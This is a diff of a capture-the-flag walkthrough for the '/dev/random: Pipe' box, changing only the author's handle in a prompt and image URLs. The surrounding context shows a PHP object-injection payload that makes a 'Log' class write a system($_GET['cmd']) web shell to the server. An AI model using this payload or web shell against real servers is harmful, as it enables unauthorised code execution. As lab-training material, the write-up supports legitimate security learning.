@@ -12,7 +12,7 @@ This is a walkthrough of a box `Pipe` series of `/dev/random`.
 ## 1. Initial Enumeration
 ### Finding the target host
 ```shell
-root@kali:/home/inar1# nmap -sP 192.168.0.0/24
+root@kali:/home/1n4r1# nmap -sP 192.168.0.0/24
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 21:50 EEST
 Nmap scan report for 192.168.0.2
 Host is up (0.000046s latency).
@@ -113,7 +113,7 @@ The painting is sometimes given as an example of meta message conveyed by parala
 
 Then, take a look at `192.168.0.3/scriptz`.<br>
 We have file listing.
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-13-53-12.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-13-53-12.png)
 
 `php.js` is for the definition of a function `serialize()` used on `index.php`.<br>
 On the other hand, log.php.BAK is for `Log` class.
@@ -151,12 +151,12 @@ class Log
 
 Using Burp Suite, we can see the content of the hidden webpage on GUI.<br>
 It is just a simple website with one hyperlink. Clicking the link shows us an interesting HTTP POST request with parameter.
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-14-23-48.png)
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-14-23-36.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-14-23-48.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-14-23-36.png)
 
 Using Burp Decoder, we can decode the parameter.<br>
 It's a PHP object of `Info` class.
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-14-25-29.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-14-25-29.png)
 ```shell
 param=O%3A4%3A%22Info%22%3A4%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A9%3A%22firstname%22%3Bs%3A4%3A%22Rene%22%3Bs%3A7%3A%22surname%22%3Bs%3A8%3A%22Margitte%22%3Bs%3A7%3A%22artwork%22%3Bs%3A23%3A%22The+Treachery+of+Images%22%3B%7D
 ```
@@ -169,8 +169,8 @@ Intercepting the POST request and sending this parameter, we can upload a webshe
 ```shell
 param=O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" <?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>";}
 ```
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-15-40-21.png)
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-15-38-20.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-15-40-21.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-15-38-20.png)
 
 Using `curl` with GET parameter, we can see that we have uploaded our webshell successfully.
 ```shell
